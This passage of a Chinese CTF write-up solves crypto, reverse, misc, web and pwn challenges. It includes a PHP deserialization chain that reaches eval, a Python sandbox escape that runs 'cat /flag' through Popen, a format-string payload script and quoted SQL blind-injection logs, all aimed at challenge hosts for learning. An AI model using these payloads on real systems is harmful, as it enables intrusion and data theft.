    return (pow(3, x, p) * pow(5, y, p)) % p

def split_key(key):
    x, y = getPrime(16), getPrime(16)
    assert x * y > key
    k1, k2 = key % x, key % y
    return k1, k2, x, y

def aes_encrypt(key, flag):
    aes = AES.new(key, AES.MODE_ECB)
    return aes.encrypt(pad(flag, 16))   

p = 1000000007

key = getrandbits(32)
k1, k2, mod1, mod2 = split_key(key)
x = f(k1, k2)

cipher = aes_encrypt(sha256(long_to_bytes(key)).digest()[:16], flag)

print(f'x = {x}')
print(f'mod = {(mod1, mod2)}')
print(f'cipher = {cipher}')
# x = 367608838
# mod = (41813, 53149)
# cipher = b'\x98\xfd\xa8\x05R\x17\xb6y%"\t\xb4\xd7\x82\xc4\'\x0b8\x14q\xff.\x13\xfb\xa4D\xb4\xde-\xd5c\xd6M\x13\x90\xdb\x81\xbd\xd0c>A\xbc)\xd0U\x7fW'
```

发现它生成了一个32位的随机key

然后将key拆分成key1和key2

使用key的SHA-256哈希前16字节作为AES-ECB密钥加密flag

我们这里写一个主要基于ASE的解密脚本

```python
from Crypto.Util.number import *
from Crypto.Cipher import AES
from hashlib import sha256
import itertools

# 已知参数
p = 1000000007
x = 367608838
mod1, mod2 = 41813, 53149
cipher = b'\x98\xfd\xa8\x05R\x17\xb6y%"\t\xb4\xd7\x82\xc4\'\x0b8\x14q\xff.\x13\xfb\xa4D\xb4\xde-\xd5c\xd6M\x13\x90\xdb\x81\xbd\xd0c>A\xbc)\xd0U\x7fW'

# 预计算3^a mod p的映射，其中a的范围是mod1的可能值
pow3_map = {}  # key
for a in range(mod1):
    val = pow(3, a, p)
    pow3_map[val] = a

# 计算5^-1 mod p，用于解5^b ≡ x/(3^a) mod p
inv5 = pow(5, -1, p)

# key1 key2
solutions = []
for a in range(mod1):
    lhs = pow(3, a, p)
    rhs = x * pow(lhs, -1, p) % p  # x / 3^a mod p
    
    # 这里太难了，直接让大模型帮我们生成一个算法
    def bsgs(g, h, p):
        m = int(p**0.5) + 1
        table = {pow(g, j, p): j for j in range(m)}
        c = pow(g, m*(p-2), p)  # g^(-m) mod p
        current = h
        for i in range(m):
            if current in table:
                return i*m + table[current]
            current = current * c % p
        return None
    
    b = bsgs(5, rhs, p)
    if b is not None:

        # 这里太难了，直接让大模型帮我们生成一个算法
        try:
            def extended_gcd(a, b):
                if b == 0:
                    return (a, 1, 0)
                else:
                    g, x, y = extended_gcd(b, a % b)
                    return (g, y, x - (a // b) * y)
            
            def modinv(a, m):
                g, x, y = extended_gcd(a, m)
                if g != 1:
                    return None
                else:
                    return x % m
            
            M = mod1 * mod2
            M1 = mod2
            M2 = mod1
            invM1 = modinv(M1, mod1)
            invM2 = modinv(M2, mod2)
            
            if invM1 is not None and invM2 is not None:
                k = (a * M1 * invM1 + b * M2 * invM2) % M
                # 因为key是32位整数，我们需要找到k + t*M < 2^32的解
                max_t = (2**32 - 1 - k) // M
                for t in range(max_t + 1):
                    candidate = k + t * M
                    solutions.append(candidate)
        except:
            pass

# 去重并按大小排序
solutions = sorted(list(set(solutions)))

# 尝试每个可能的key来解密flag
for key in solutions:
    try:
        key_bytes = long_to_bytes(key)
        aes_key = sha256(key_bytes).digest()[:16]
        aes = AES.new(aes_key, AES.MODE_ECB)
        decrypted = aes.decrypt(cipher)
        
        # 检查解密结果是否包含flag格式
        if b'flag{' in decrypted:
            padding_len = decrypted[-1]
            if padding_len <= 16:
                flag = decrypted[:-padding_len]
                if b'flag{' in flag:
                    print(f'Found key: {key}')
                    print(f'Flag: {flag.decode()}')
                    exit()
    except:
        pass

print("Fail to find the flag")
```

得出：flag{e31343dd-4795-4236-bbec-11b8410b5ce6}



# Week3

## web

### **魔术大杂烩**

#### 解题过程

题目提供的 PHP 代码定义了 6 个类，每个类包含不同的**PHP 魔术方法**

核心考点是通过**反序列化触发魔术方法调用链**，最终利用`Huluobo`类中`__set`方法的`eval`函数执行命令，读取 flag。

大模型思路如下

```
反序列化 Wuhuarou 对象 → 触发 __wakeup() → echo $this->Wuhuarou（Fentiao对象） → 触发 Fentiao::__toString()
→ 访问 $this->Fentiao->Hongshufentiao（Baicai无此属性） → 触发 Baicai::__get()
→ 执行 $this->Baicai()（Wanzi对象当函数） → 触发 Wanzi::__invoke()
→ 调用 $this->Wanzi->Xianggu()（Xianggu无此方法） → 触发 Xianggu::__call()
→ 给 $this->Xianggu->Bailuobo 赋值（Huluobo无此属性） → 触发 Huluobo::__set()
→ 执行 eval($arg)（$arg为自定义命令） → 读取flag
```

生成序列化字符串

```php
<?php
// 1. 定义题目中的所有类（仅需类结构，无需魔术方法实现）
class Wuhuarou{public $Wuhuarou;}
class Fentiao{public $Fentiao; public $Hongshufentiao;}
class Baicai{public $Baicai;}
class Wanzi{public $Wanzi;}
class Xianggu{
    public $Xianggu; 
    public $Jinzhengu; 
    public function __construct($Jinzhengu){$this->Jinzhengu = $Jinzhengu;}
}
class Huluobo{public $HuLuoBo;}

// 2. 按调用链创建对象并关联属性
$hlb = new Huluobo();

// Xianggu对象：传递命令，关联Huluobo
$cmd = "echo file_get_contents('/flag');";
$xg = new Xianggu($cmd); // 构造函数赋值命令到$Jinzhengu
$xg->Xianggu = $hlb; // 关联Huluobo，用于触发__set

// Wanzi对象：关联Xianggu，触发__call
$wz = new Wanzi();
$wz->Wanzi = $xg;

// Baicai对象：关联Wanzi，触发__invoke
$bc = new Baicai();
$bc->Baicai = $wz;

// Fentiao对象：关联Baicai，触发__get
$ft = new Fentiao();
$ft->Fentiao = $bc;

// 入口对象：Wuhuarou，关联Fentiao，触发__toString
$whr = new Wuhuarou();
$whr->Wuhuarou = $ft;

// 3. 生成序列化字符串（用于POST提交）
echo serialize($whr);
?>
```

得到结果

```
O:8:"Wuhuarou":1:{s:8:"Wuhuarou";O:6:"Fentiao":2:{s:6:"Fentiao";O:6:"Baicai":1:{s:6:"Baicai";O:5:"Wanzi":1:{s:5:"Wanzi";O:7:"Xianggu":2:{s:7:"Xianggu";O:7:"Huluobo":1:{s:7:"HuLuoBo";N;}s:8:"Jinzhengu";s:28:"echo file_get_contents('/flag');";}}}s:13:"Hongshufentiao";N;}}
```

发送请求

```cmd
curl -X POST -d "eat=O:8:\"Wuhuarou\":1:{s:8:\"Wuhuarou\";O:6:\"Fentiao\":2:{s:6:\"Fentiao\";O:6:\"Baicai\":1:{s:6:\"Baicai\";O:5:\"Wanzi\":1:{s:5:\"Wanzi\";O:7:\"Xianggu\":2:{s:7:\"Xianggu\";O:7:\"Huluobo\":1:{s:7:\"HuLuoBo\";N;}s:8:\"Jinzhengu\";s:28:\"echo file_get_contents('/flag');\";}}}s:13:\"Hongshufentiao\";N;}}" http://challenge.ilovectf.cn:30448/
```

得到：flag{68129c68-c3f7-45f9-b621-140647247f8f}



### **这又是什么函数**

#### 解题过程

开启容器，查看源码，发现这是纯前端没有包含任何数据处理逻辑

题目提示信息搜集且不在这个网页

首先尝试网址拼接，如/robots.txt、hint.txt、flag.txt等，但是都没有任何效果

使用专业工具**dirsearch**

```cmd
D:\Environment\dirsearch\dirsearch-0.4.3>python dirsearch.py -u http://challenge.ilovectf.cn:30403/ -e *
```

查到它泄露出来的文件/src，拼接网址查看

通过查看源码发现，这是一个flask服务，代码中纯在eval任意代码执行漏洞可以利用

```python
@app.route('/doit', methods=['GET', 'POST'])
def doit():
    e=request.form.get('e')
    try:
        eval(e) # 任意代码执行漏洞
        return "done!" # 无回显
    except Exception as e:
        return "error!"
```

针对这种无回显的任意代码执行漏洞，我们先选择构造一个覆盖return的payload

```python
import sys;f=sys._current_frames()[0].f_code.co_name;exec(f"def {f}():return open('/flag').read()")
```

提交返回error!

搜索了一番，发现原来是前端请求头中的请求方式是json

```html
content-type: application/json
```

```js
// index源码
// 向 /doit 路由发送 POST 请求，参数 e 为输入的字符串
const response = await fetch('/doit', {
	method: 'POST',
	headers: {
		'Content-Type': 'application/json',
	},
	body: JSON.stringify({ e: inputStr })
	});
alert('你应该找找这个包要干什么');
```

而后端接收请求的方式是表单form

```python
e=request.form.get('e')
```

导致e获取到的是None从而返回error!

为了让后端能够成功接收我们的payload

我让大模型帮我写一段js代码可以在console控制台中执行**重写它的submitData方法**

```js
// 1. 重定义submitData函数，发表单格式请求
function submitData() {
    const inputStr = document.getElementById('stringInput').value.trim();
    const submitBtn = document.getElementById('submitBtn');
    submitBtn.disabled = true;
    submitBtn.innerHTML = '<span>⏳</span><span>提交中...</span>';
    
    // 表单格式请求核心：Content-Type + 表单体
    fetch('/doit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `e=${encodeURIComponent(inputStr)}` // 表单格式传递e，后端可读取
    })
    .then(res => res.text())
    .then(data => alert(`成功！返回内容：${data}`)) // 弹窗显示响应，便于调试
    .catch(err => alert('传输出错'))
    .finally(() => {
        submitBtn.disabled = false;
        submitBtn.innerHTML = '<span>✉️</span><span>提交字符串</span>';
    });
}

// 2. 解绑旧点击事件，绑定新函数（确保执行新逻辑）
const submitBtn = document.getElementById('submitBtn');
const oldHandlers = getEventListeners(submitBtn).click || [];
oldHandlers.forEach(h => submitBtn.removeEventListener('click', h.listener));
submitBtn.addEventListener('click', submitData);

// 3. 处理Ctrl+Enter快捷提交（同步新逻辑）
const stringInput = document.getElementById('stringInput');
const oldKeyHandlers = getEventListeners(stringInput).keydown || [];
oldKeyHandlers.forEach(h => stringInput.removeEventListener('keydown', h.listener));
stringInput.addEventListener('keydown', (e) => {
    if (e.ctrlKey && e.key === 'Enter') submitData();
});

alert('请求格式配置完成！已改为表单格式');
```

接下来尝试提交payload

为了让payload可以执行多条命令，我们用exec()来包裹我们的payload

**测试**

修改 Flask 视图函数 -> × 无法拿到flask的实例app

修改函数帧返回值 -> × `sys` 模块被沙箱环境限制，无法导入

Python 内置子类链逃逸 -> √

```python
exec("obj_subclasses = ().__class__.__bases__[0].__subclasses__();Popen = obj_subclasses[142].__init__.__globals__['Popen'];flag = Popen(['cat', '/flag'], stdout=-1).communicate()[0].decode();raise Exception(f'{flag}')")
```

在抛出的Exception，即在响应中找到flag

得出：flag{25ec2584-6a2f-45f3-8865-99e07f947bdb}



## misc

### **《关于我穿越到CTF的异世界这档事:Q》**

#### 解题过程

下载解压得到：游戏.exe

熟悉游戏操作

```
AD #左右
Space #跳跃
Shift #冲刺
```

不断闯关获得**flag碎片**

```
flag1: ZmxhZ3tZMHV
flag2: fQHJlX1
flag3: JlQDExeV9
flag4: BX0cwMGR
flag5: fR0FNRV
flag6: IhISF9
```

拼凑出完整的flag

```
flag: ZmxhZ3tZMHVfQHJlX1JlQDExeV9BX0cwMGRfR0FNRVIhISF9
```

一看看出是base64编码，解码得

```
flag: flag{Y0u_@re_Re@11y_A_G00d_GAMER!!!}
```

结果可读性强，满足需求

得出：flag{Y0u_@re_Re@11y_A_G00d_GAMER!!!}



### **文化木的侦探委托(三)**

#### 解题过程

下载

解压

得到：flag.docx

利用**word编辑器**打开

得到flag{keep_m0ving_forward_f0r_the_ro@d_ahead_1s_l0nger_and_hard3r}

提交发现回答正确

得出：flag{keep_m0ving_forward_f0r_the_ro@d_ahead_1s_l0nger_and_hard3r}



## reverse

### **Trap**

#### 解题过程

下载解压直接扔进IDA一眼看出是一个十分基础的加密程序

```
获取输入 -> 加密输入 -> 密文对比 -> 判断对错
```

但留意到题目给的提示：小心脚下。

浏览一下发现，它在sub_140001200函数中有一个**防调试机制**，

导致静态逆向和动态调试会得出不一样的flag

于是我们放弃调试的念头，用**纯静态**的代码审计来还原flag

我们写一个还原脚本

```python
KEY_ARRAY = [0x31, 0x69, 0x34, 0x57, 0x99, 0x35, 0x77, 0x11, 0x36, 0x52, 0x76]

# 目标数组（从汇编代码中直接提取，不做任何处理）
TARGET = [0x57, 0x51, 0x04, 0x3B, 0xD9, 0xB6, 0xF1, 0x96, 
          0xFF, 0xC4, 0xF2, 0x96, 0xCC, 0xA6, 0xB4, 0x1B, 
          0x4D, 0x01, 0x60, 0x32, 0x04, 0x2C, 0x5B, 0x43, 
          0x47, 0x72, 0xB4, 0xB5, 0xB0, 0x96, 0xD0, 0xFE]

for i, val in enumerate(KEY_ARRAY):
    print(f"KEY_ARRAY[{i}] = 0x{val:02X}")

encrypted_data = TARGET.copy()
key = []
for i in range(len(encrypted_data) - 1, -1, -1):
    if i > 0:
        encrypted_data[i] ^= encrypted_data[i - 1]
    
    key_idx = i % 11
    if i % 2 == 1:
        plain_char = (encrypted_data[i] ^ (KEY_ARRAY[key_idx] + 1)) & 0xFF
    else:
        plain_char = (encrypted_data[i] ^ KEY_ARRAY[key_idx]) & 0xFF
        
    key.insert(0, plain_char)
    
flag = ''.join([chr(c & 0xFF) for c in key])

print(f"\n正确的Flag: {flag}")
```

得出：flag{Y0u_h@V3_E5c4ped_Fr0m_7r4p}



### **babyre**

#### 解题过程

下载解压后得到babyer

直接扔进IDA查看伪代码

大概翻了一下发现它是一个具有很强混淆性，**看起来很混乱的RC4加密****

这道题目逆向的点大概是在位运算的逆向还原

利用大模型辅助写一个还原脚本

```python
# 从伪代码中提取的目标字符串
target = [
    0xC6, 0xAC, 0xEE, 0x8B, 0x57, 0x04, 0x64, 0x3A, 0xA7, 0x3B,
    0x84, 0x67, 0xAC, 0xD7, 0x8E, 0xD8, 0x1D, 0x03, 0x85, 0x55,
    0xF6, 0x51, 0x90, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    # ... 更多数据 ...
]

# 从伪代码中提取的密钥
key = [0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF]

# 实现位运算的逆变换
def reverse_bit_operation(byte):
    # 原操作：b' = ((b >> 5) & 0x07) | ((b << 3) & 0xF8)
    # 我们需要找到b，使得b'等于给定的字节
    for b in range(256):
        shifted_right = (b >> 5) & 0x07  # 右移5位，保留低3位
        shifted_left = (b << 3) & 0xF8   # 左移3位，保留高5位
        transformed = shifted_right | shifted_left
        
        if transformed == byte:
            return b
    return 0

# 实现RC4解密算法
def rc4_decrypt(ciphertext, key):
    # 初始化S盒
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    
    # 解密过程
    plaintext = []
    i = j = 0
    for byte in ciphertext:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        k = S[(S[i] + S[j]) % 256]
        plaintext.append(byte ^ k)
    
    return plaintext

# 1. 先对每个字节进行逆位运算变换
reversed_bits = [reverse_bit_operation(b) for b in target]

# 2. 再对变换后的数据进行RC4解密
flag_bytes = rc4_decrypt(reversed_bits, key)

# 3. 转换为字符串并过滤有效字符
flag = ''.join([chr(b) for b in flag_bytes if 32 <= b <= 126])

print("Flag:", flag)
```

运行得到结果flag{Ju4t_4_S1mpl3_RC4}**长度为23**满足条件

得出：flag{Ju4t_4_S1mpl3_RC4}



### **wtf**

#### 解题过程

创建容器，用http打开容器网页

查看源代码，发现索引index.html里面调用了两个js：src.js和div.js

div.js里应该是给的一个提示，里面是一段**JSFuck**的编码文本

JSFuck编码的文本可以被当作js直接执行，所以我们直接将内容复制粘贴到console控制台运行

得到隐藏函数，审计一下发现__key.toString的隐藏代码具有混淆的作用

根据这个函数得出真是的key：K0meji_K0ishi

下一步查看src.js这是核心的加密过程

包含：**亦或运算**和**TEA加密**

我们逆向这个过程

逆向最后一次亦或过程

```javascript
after_xor = [];
for (i = 0; i < ans.length; i++) {
    key_char = ord(___Key[i % ___Key.length]);
    after_xor.push(ans[i] ^ key_char);
}
```

然后逆向**TEA**加密，我们这里利用大模型思路得出算法

结合我们之前得出的key值：**K0meji_K0ishi**

```javascript
function tea_decrypt(v0, v1, k) {
    sum = 0xC6EF3720;  // 32 * 0x9e3779b9
    DELTA = 0x9e3779b9;
    
    for (i = 0; i < 32; i++) {
        v1 -= (((v0 << 4) + k[2]) ^ (v0 + sum) ^ ((v0 >> 5) + k[3]));
        v0 -= (((v1 << 4) + k[0]) ^ (v1 + sum) ^ ((v1 >> 5) + k[1]));
        sum -= DELTA;
    }
    
    return [v0, v1];
}
```

最后逆向亦或的前四个字节

```javascript
// 逆向前四个字节的异或操作
final[0] ^= 0x12;
final[1] ^= 0x34;
final[2] ^= 0x56;
final[3] ^= 0x78;
```

得出：flag{J$_1s_VERy_dynamIc}



## pwn

### **key 的大冒险(1)**

#### 解题过程

下载得到源码文件adventure1扔进IDA里静态分析

看了半天没有看出什么玄机...

nc连接玩弄了半天还是没玩出什么玄机...

最后恍然大悟，可能是我**太高估这道题的难度了**

也许...它真的只要达到一定的属性然后输入1就可以通关了...吗

可是金币只有这么点，怎么堆属性好像都不行...

最后我也是很无语地发现它没钱了好像还能买装备...

而且属性只有买后立刻用才能加...

而且我发现装备武器好像...不需要我拥有装备...

最后我也是很无语地**叠了一堆属性然后输入1获得了flag**

得出：flag{Key_63tS_$0mE_unIIMIteD_63Ar}



### **弥达斯之触**

#### 解题过程

下载解压得到midas文件

直接扔进IDA查看伪代码

根据大模型提示看出它直接将用户的输入作为格式化字符串，存在**格式化字符串漏洞**可加以利用

```c
 printf(buf);
```

在init函数找到flag

分析得到flag的内存地址 -> a的内存地址(在main中由mmap映射) -> 0x10000

```c
fd = open("/flag", 0, 0LL);
  read(fd, a1, 0x100uLL);  // 读取flag到a1指向的内存
```

百度一下得到：在x86-64架构中，前6个参数通过寄存器传递，之后的参数通过栈传递。`buf`作为第7个参数（假设栈上的偏移是7），可以通过`%7$s`来访问。

构造payload = b'%7$s\n'

我们需要写一个脚本来攻击获取flag，那么什么时候发送呢

代码审计

```c
# 先接收它的欢迎
# 我们输入
# 它开启了内存保护 -> mprotect(addr, 0x1000uLL, 1);
# 接收它的反馈
# 我们输入...
...
```

很明显它开启内存保护后内存为只读，**在此之前我们可读可写**，需要我们要在此之前发送payload

写一个攻击脚本

```python
import socket

# 连接到服务器
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('challenge.ilovectf.cn', 30680))

# 接收欢迎消息
data = s.recv(1024)
print(data.decode('utf-8', errors='ignore'))

# 尝试直接读取 0x10000 地址处的字符串
payload = b'%7$s\n'
s.send(payload)

data = s.recv(4096)
print(data.decode('utf-8', errors='ignore'))

s.close()
```

接收反馈：

```
远道而来的年轻人，你也是来寻找弥达斯的秘密吗？
flag{2308a120-2e9c-4189-a925-852393e172be}
噢不，噢不，你太心急了。
```

得出：flag{2308a120-2e9c-4189-a925-852393e172be}



# Week4

## misc

### **布豪有黑客(四)**

#### 解题过程

下载解压得到：access.log

这是一个SQL流量日志，对方(黑客)使用的方法是**SQL布尔盲注**获取flag的value

这是一道偏取证的题目

我们要做的第一步就是**化繁为简**，将高度混淆的SQL语句简化成我们好理解能看懂的数学语言

即将

```sql
[2025-10-01 13:42:38] Page: article.php | Query: UPDATE articles SET views = views + 1 WHERE id = 1 | IP: 127.0.0.1 | UA: python-requests/2.32.3
[2025-10-01 13:42:38] Page: article.php | Query: SELECT * FROM articles WHERE id = 1 | IP: 127.0.0.1 | UA: python-requests/2.32.3
[2025-10-01 13:42:38] Page: article.php | Query: SELECT * FROM articles WHERE author = 'admin' AND CASE WHEN (SELECT UNICODE(SUBSTR(value, 1, 1)) FROM secrets WHERE key='flag' LIMIT 1) >= 79 THEN LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(50000000)))) ELSE 1 END-- -' | IP: 127.0.0.1 | UA: python-requests/2.32.3
[2025-10-01 13:42:40] Page: article.php | Query: UPDATE articles SET views = views + 1 WHERE id = 1 | IP: 127.0.0.1 | UA: python-requests/2.32.3
[2025-10-01 13:42:40] Page: article.php | Query: SELECT * FROM articles WHERE id = 1 | IP: 127.0.0.1 | UA: python-requests/2.32.3
[2025-10-01 13:42:40] Page: article.php | Query: SELECT * FROM articles WHERE author = 'admin' AND CASE WHEN (SELECT UNICODE(SUBSTR(value, 1, 1)) FROM secrets WHERE key='flag' LIMIT 1) >= 103 THEN LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(50000000)))) ELSE 1 END-- -' | IP: 127.0.0.1 | UA: python-requests/2.32.3
[2025-10-01 13:42:40] Page: article.php | Query: UPDATE articles SET views = views + 1 WHERE id = 1 | IP: 127.0.0.1 | UA: python-requests/2.32.3
[2025-10-01 13:42:40] Page: article.php | Query: SELECT * FROM articles WHERE id = 1 | IP: 127.0.0.1 | UA: python-requests/2.32.3
[2025-10-01 13:42:40] Page: article.php | Query: SELECT * FROM articles WHERE author = 'admin' AND CASE WHEN (SELECT UNICODE(SUBSTR(value, 1, 1)) FROM secrets WHERE key='flag' LIMIT 1) >= 91 THEN LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(50000000)))) ELSE 1 END-- -' | IP: 127.0.0.1 | UA: python-requests/2.32.3
[2025-10-01 13:42:42] Page: article.php | Query: UPDATE articles SET views = views + 1 WHERE id = 1 | IP: 127.0.0.1 | UA: python-requests/2.32.3
[2025-10-01 13:42:42] Page: article.php | Query: SELECT * FROM articles WHERE id = 1 | IP: 127.0.0.1 | UA: python-requests/2.32.3
[2025-10-01 13:42:42] Page: article.php | Query: SELECT * FROM articles WHERE author = 'admin' AND CASE WHEN (SELECT UNICODE(SUBSTR(value, 1, 1)) FROM secrets WHERE key='flag' LIMIT 1) >= 97 THEN LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(50000000)))) ELSE 1 END-- -' | IP: 127.0.0.1 | UA: python-requests/2.32.3
[2025-10-01 13:42:45] Page: article.php | Query: UPDATE articles SET views = views + 1 WHERE id = 1 | IP: 127.0.0.1 | UA: python-requests/2.32.3
[2025-10-01 13:42:45] Page: article.php | Query: SELECT * FROM articles WHERE id = 1 | IP: 127.0.0.1 | UA: python-requests/2.32.3
[2025-10-01 13:42:45] Page: article.php | Query: SELECT * FROM articles WHERE author = 'admin' AND CASE WHEN (SELECT UNICODE(SUBSTR(value, 1, 1)) FROM secrets WHERE key='flag' LIMIT 1) >= 100 THEN LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(50000000)))) ELSE 1 END-- -' | IP: 127.0.0.1 | UA: python-requests/2.32.3
[2025-10-01 13:42:47] Page: article.php | Query: UPDATE articles SET views = views + 1 WHERE id = 1 | IP: 127.0.0.1 | UA: python-requests/2.32.3
[2025-10-01 13:42:47] Page: article.php | Query: SELECT * FROM articles WHERE id = 1 | IP: 127.0.0.1 | UA: python-requests/2.32.3
[2025-10-01 13:42:47] Page: article.php | Query: SELECT * FROM articles WHERE author = 'admin' AND CASE WHEN (SELECT UNICODE(SUBSTR(value, 1, 1)) FROM secrets WHERE key='flag' LIMIT 1) >= 101 THEN LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(50000000)))) ELSE 1 END-- -' | IP: 127.0.0.1 | UA: python-requests/2.32.3
[2025-10-01 13:42:49] Page: article.php | Query: UPDATE articles SET views = views + 1 WHERE id = 1 | IP: 127.0.0.1 | UA: python-requests/2.32.3
[2025-10-01 13:42:49] Page: article.php | Query: SELECT * FROM articles WHERE id = 1 | IP: 127.0.0.1 | UA: python-requests/2.32.3
[2025-10-01 13:42:49] Page: article.php | Query: SELECT * FROM articles WHERE author = 'admin' AND CASE WHEN (SELECT UNICODE(SUBSTR(value, 1, 1)) FROM secrets WHERE key='flag' LIMIT 1) >= 102 THEN LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(50000000)))) ELSE 1 END-- -' | IP: 127.0.0.1 | UA: python-requests/2.32.3
```

转化成

```
位1
>=70、>=79、
>=103、>=91、
>=97、>=100、
>=101、>=102
```

然后用**数学推敲**的方法，和**换位思考**的方法猜出

```
位1=102	Unicode编码 -> 'f'
```

同理我们得到

```
flag{
56/57	U
31	16
49	U
110/111	U
100	U
5F/60	16
53/54	U
113/114	U
49	U
95/96	U
49	U
110/111	U
106	U
50/51	U
98/99	U
55	U
5F/60	16
52	U
110/111	char
52	U
49	U
79	16
122/123	U
50/51	U
113/114	U
}
```

将它们转化为字符试试

```
flag{
8/9
11
n/o
d
_/`
5/6
q/r
1
_/`
1
n/o
j
2/3
b/c
7
_/`
4
n/o
41y
2/3
q/r
}
```

根据flag的规范可以在`_`和```之中选择出_

得到

```
flag{
8/9
11
n/o
d_
5/6
q/r
1_1
n/o
j
2/3
b/c
7_4
n/o
41y
2/3
q/r
}
```

但还剩2的10次方即**1024种**不同的排列组合

而且这些选项还是**不能**通过日志内容进行排除的

这可不行，我们需要一点相似排除的思想

首先知道这题考的是**数据库盲注分析**，就可以得出选择

第一段

```
811nd -> blind -> 盲
```

第二段

```
5q1 -> sql -> 数据库
```

第三段

```
1nj3ct -> inject -> 注入
```

第四段

```
4n41y3r -> analyer -> 分析者
```

即

```
blind_sql_inject_analyer -> 811nd_5q1_1nj3c7_4n41yz3r
```

最后补上flag格式

得出：flag{811nd_5q1_1nj3c7_4n41yz3r}



### **文化木的侦探委托(四)**

#### 解题过程

下载解压得到：flag.zip(需要解压密码) 和 ？.zip

解压并打开？.zip

首先看到大小最小的what's_this?

```
...
    run_command: '{python} -u {filename}'
    ...
    title: whereispassword???
    ...
    value: '44100' # 采样率
  ...
- name: band_pass_filter_0 # 带通滤波，保留有效频率
  ...
- name: blocks_complex_to_float_0 # 复数转实数，适配音频输出
  ...
    file: "/mnt/c/Users/15871/Desktop/\u6587\u5316\u6728\u7684\u4E8B\u52A1\u59D4\u6258\
      /week4/\u65B0\u5EFA\u6587\u4EF6\u5939/password.wav"
    ...
- name: virtual_source_1 # 虚拟IQ信号源
  ...
- [blocks_complex_to_float_0, '0', audio_sink_0, '0'] # recovered_password.wav
...
- [blocks_float_to_complex_0, '0', band_pass_filter_0, '0'] # 实数转复数，生成IQ信号
...
```

然后再查看其他文件发现是乱码

结合剩下的文件，和题目提示"**对方留下了充足的线索给让她能拿到原始的音频**"

所有我们得出一个目标那就是先利用这个文件来还原原始的音频文件

百度一下知道我们手头的是GRC文件，我们的目标是通过这些文件来还原WAV文件

写一个还原脚本

```python
import numpy as np
from scipy.io import wavfile

# 读取 password...？ 文件（GRC的file_sink默认存为float32二进制）
password_file = "password...？"
data = np.fromfile(password_file, dtype=np.float32)  # 按float32读取

# 反向处理：除以2.5（抵消乘法常数）
recovered_wav_data = data / 2.5

# 保存为wav文件（采样率和原始一致，即44100）
wavfile.write("recovered_password.wav", 44100, recovered_wav_data.astype(np.float32)) # 采样率
```

这里说明一下，这里的**采样率**是一个重要的参数，它深刻地影响着我们声音的频率**pitch**

我们对音频的理解，通常认为一个音频文件存的是每帧对应多大的响度，多高的音调

其实一般的音频它存储的每帧的信息，而是采样率

一个音频文件包含非常之多的采样率，采样率包含了响度信息，采样率的密集排列聚合才形成了音调的信息

所以如果还原一个音频，采样率不一致，会导致结果也不一致

然后运行脚本我们获得了recovered_password.wav

直接将recovered_password.wav扔进Audacity中查看

波形图看不出什么有效信息，我们直接仅看频谱图

我们发现它600-1700的音调中有非常明显的高低音区分

结合题目介绍：...密码是前几天半夜突然响起的**电话拨号的音频**...

搜一下这考的是拨号键对应的音频，即**DTMF**

注意到它除了0-9还有*、#、ABCD的

```
按键	低频（Hz）	高频（Hz）
1	697			1209
2	697			1336
3	697			1477
A	697			1633
4	770			1209
5	770			1336
6	770			1477
B	770			1633
7	852			1209
8	852			1336
9	852			1477
C	852			1633
*	941			1209
0	941			1336
#	941			1477
D	941			1633
```

根据音频文件对应的HZ我们得出密码：24#A1B87C4*0#DD

解压flag.zip并双击打开得到flag

得出：flag{Wh@t_I_hope_you_wi11_seek_i5_y0ur_true_self_wi7hin.}



## crypto

### **Myneighbors**

#### 解题过程

下载解压得到：task.sage

sage指的是SageMath

根据题目给出的参考文献：[1321.pdf](https://eprint.iacr.org/2019/1321.pdf)

结合大模型辅助学习，得知，这是一个基于**超奇异椭圆曲线**同构的密码题

我们需要找到隐藏的`magical_num`值，然后推导出正确的解密密钥来获取flag

我们同样用一个sage来解密

```python
p = 431
F.<i> = GF(p^2, modulus = x^2 + 1)

# 首先，我们需要找到所有可能的magical_num值
# 条件1: E是超奇异的
# 条件2: E的j不变量在其2-邻居集合中

from Crypto.Util.Padding import unpad
from Crypto.Cipher import AES
import hashlib

def find_magical_num():
    # 对于每个可能的j值，检查条件
    print(f"寻找可能的magical_num值...")
    possible_j = []
    
    # 遍历所有可能的j值
    for j in F:
        try:
            E = EllipticCurve(j=j)
            if not E.is_supersingular():
                continue
                
            # 检查条件2
            P = E(0).division_points(2)[1:]
            neighbors = []
            for idx in range(len(P)):
                try:
                    phi = E.isogeny(P[idx])
                    EE = phi.codomain()
                    neighbors.append(EE.j_invariant())
                except:
                    continue
            
            if E.j_invariant() in neighbors:
                possible_j.append(j)
                print(f"找到可能的j不变量: {j}")
        except:
            continue
    
    return possible_j

def decrypt_flag(j_final):
    # 使用j_final计算密钥和iv
    H = hashlib.md5(str(j_final).encode()).hexdigest().encode()
    key, iv = H[:16], H[16:]
    
    # 已知的密文
    cipher_hex = '49e90a91357fef12c54234b3cb553bb2fdd61f2af8c7e78b3d5ffdeac7022af0'
    cipher = bytes.fromhex(cipher_hex)
    
    # 尝试解密
    try:
        aes = AES.new(key, AES.MODE_CBC, iv)
        plaintext = aes.decrypt(cipher)
        unpadded = unpad(plaintext, 16)
        return unpadded.decode()
    except:
        return None

# 找到可能的j不变量
possible_j = find_magical_num()
print(f"找到 {len(possible_j)} 个可能的j不变量")

# 对于每个可能的j，尝试所有可能的3-除点映射
for j in possible_j:
    print(f"\n尝试j不变量: {j}")
    try:
        E = EllipticCurve(j=j)
        P = E(0).division_points(3)[1:]
        print(f"找到 {len(P)} 个3-除点")
        
